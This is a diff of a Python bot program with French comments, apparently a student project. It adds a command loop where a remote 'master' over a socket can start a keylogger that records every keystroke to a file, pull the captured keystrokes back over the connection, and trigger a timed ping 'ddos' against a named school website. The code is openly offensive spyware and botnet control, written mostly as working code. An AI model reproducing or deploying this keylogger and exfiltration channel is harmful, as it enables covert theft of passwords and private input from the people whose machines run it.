@@ -4,6 +4,8 @@ from pynput.keyboard import Key, Listener
 import logging
 import threading
 import time
+from datetime import datetime
+from pythonping import ping
 
 lock = threading.Lock()
 
@@ -25,14 +27,15 @@ fais ce qui te plais avec les 2 methodes au dessus a toi de t'amuser :D
 
 class Connexion():
     # création de l'objet connexion avec le champ adresseMachine
-    def __init__(self, adresseMachine, carteReseauEcoute, carteReseauConn):
+    def __init__(self, adresseMachine, carteReseauEcoute, carteReseauConn, donnee):
         self.adresseMachine = adresseMachine
         self.carteReseauEcoute = carteReseauEcoute
         self.carteReseauConn = carteReseauConn
+        self.donnee = donnee
 
 
     #1er étape, mettre en place un canal de communication pour recevoir les messages du master
-    def listen(self, carteReseauEcoute):
+    def listen(self, carteReseauEcoute, donnee):
         # écoute sur toutes l'adresse du slave et sur le port 60 000
         adresseMachineMaitre = (("localhost", 60000))
         carteReseauEcoute.bind(adresseMachineMaitre)
@@ -42,8 +45,29 @@ class Connexion():
         carteReseauEcoute.listen(5)
         connReseau, addr = carteReseauEcoute.accept()
         print("Connecté avec la machine : ", addr)
-        connReseau.recv(1024).decode("utf-8")
-
+        #boucle qui permet de lancer une methode de l'objet communication
+        try:
+            while donnee != "FIN":
+                if donnee == "keylogger":
+                    print("OK je lance le keylogger")
+                    #lance la methode start_log de l'objet Communication
+                    a.start_log(connReseau, donnee)
+                elif donnee == "transfert":
+                    print("J'envoie le keylogger")
+                    a.get_log(connReseau, donnee)
+                elif donnee == "ddos":
+                    print("on lance le ddos")
+                    a.ddos()
+                donnee = connReseau.recv(1024).decode("utf-8")
+        except ConnectionResetError:
+            print("Connexion arreté par le maitre")
+            a.listen(carteReseauEcoute, donnee)
+        
+        connReseau.send(b"J'ecoute")
+        print("Fini je re-écoute")
+        carteReseauEcoute.close()
+        carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
+        a.listen(carteReseauEcoute, donnee)
 
         
 
@@ -54,60 +78,79 @@ class Connexion():
             carteReseauConn.connect(adresseMachine)
             carteReseauConn.send(b"Je me connecte")
             print("IP envoyée au master")
-            a.listen(carteReseauEcoute)
+            a.listen(carteReseauEcoute, donnee)
         except ConnectionRefusedError:
             print("Machine maitre non connecté")
         
 
 
-class Action():
+class Action(Connexion):
 
-    def __init__(self, data):
-        self.data = data
+    def __init__(self, donnee):
+        self.donnee = donnee
 
-    def start_log(self, data, connReseau):
-        #chemin ou seront écris les logs voulus
-        log_dir = r"C:\\Users\\Salihu Brilant\\Desktop"
-        #met les informations de base concernant le logger
-        #filename, spécifie le nom du fichier
-        #format, impose les infos de base qui se trouveront dans le logger, içi la date avec l'heure puis les infos sur les entrées sur le clavier 
-        logging.basicConfig(filename = (log_dir + "\\keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-        #Création d'une fonction appuie(), qui vas mettre en string touts les appuie sur le clavier
-        def appuie(key):
-            logging.info(str(key))  
-        #une fois rentrer içi le programme écoute les appuie sur les entrées
-        with Listener(on_press=appuie) as listener:
-            connReseau.send(b"Logger actif")
-            #cette condition nous permet d'arreter le logger
-            if connReseau.recv(1024).decode("utf-8") != "stop":
-                listener.join()
-            connReseau.send(b"Logger inactif")
-            print("Logger arretée")
-            # !!!!!!! Je ne sais pas comment recommencer le programme une fois le logger arreté !!!!!!!!
-        data = connReseau.recv(1024).decode("utf-8")
+    def start_log(self, connReseau, donnee):
+        try:
+            #chemin ou seront écris les logs voulus
+            log_dir = r"E:"
+            #met les informations de base concernant le logger
+            #filename, spécifie le nom du fichier
+            #format, impose les infos de base qui se trouveront dans le logger, içi la date avec l'heure puis les infos sur les entrées sur le clavier 
+            logging.basicConfig(filename = (log_dir + "\\keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+            #Création d'une fonction appuie(), qui vas mettre en string touts les appuie sur le clavier
+            def appuie(key):
+                logging.info(str(key))
+
+            #une fois rentrer içi le programme écoute les appuie sur les entrées
+            with Listener(on_press=appuie) as listener:
+                connReseau.send(b"Logger actif")
+                #cette condition nous permet d'arreter le logger
+                if connReseau.recv(1024).decode("utf-8") != "stop":
+                    listener.join()
+                connReseau.send(b"Logger inactif")
+                print("Logger arretée")
+        except FileNotFoundError:
+            print("erreur chemin inexistant")
+    
+    def get_log(self, connReseau, donnee):
+        logger = open("E:\\keyLog.txt", "r")
+        fichier = logger.read()
+        connReseau.send(fichier.encode("utf-8"))
+
+    def ddos(self):
+        #définir le format de la date quand on la rentrera dans la variable
+        format = "%Y-%m-%d %H:%M"
+        #on récupère la date et l'heure actuelle et on la formate comme voulu ci dessus
+        now = datetime.strftime(datetime.now(), format)
+        #on compare la date et l'heure récupérées à celle souhaitée pour le ddos
+        if (now == "2019-12-04 22:24"):
+            #on envoie la requête, verbose permet d'afficher le ping, size gère sa taille et count le nombre de paquets
+            ping ('www.henallux.be', verbose=True, size=400, count=15)
+            print("ping okay")
+        else:
+            print("error")
+
+
 
 
 adresseMachine = ("localhost", 60000)
 carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
 carteReseauConn = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
-a = Connexion(adresseMachine, carteReseauConn, carteReseauEcoute)
+donnee = ""
+a = Action(donnee)
+
 
 a.sendIP(carteReseauConn, adresseMachine)
+
+
+
 
     
 
 
-"""
-#boucle qui permet de lancer une methode de l'objet communication
-while data != "FIN":
-    if data == "keylogger":
-        print("OK je lance le keylogger")
-        #lance la methode start_log de l'objet Communication
-        a.start_log(data, conn)
-        data = connReseau.recv(1024).decode("utf-8")
-    data = connReseau.recv(1024).decode("utf-8")
-# rajoute ddos() ou send_log(), choisi :D
-"""
+
+
+
 
 """
 Dernier problème que je ne comprend pas dans notre programme.
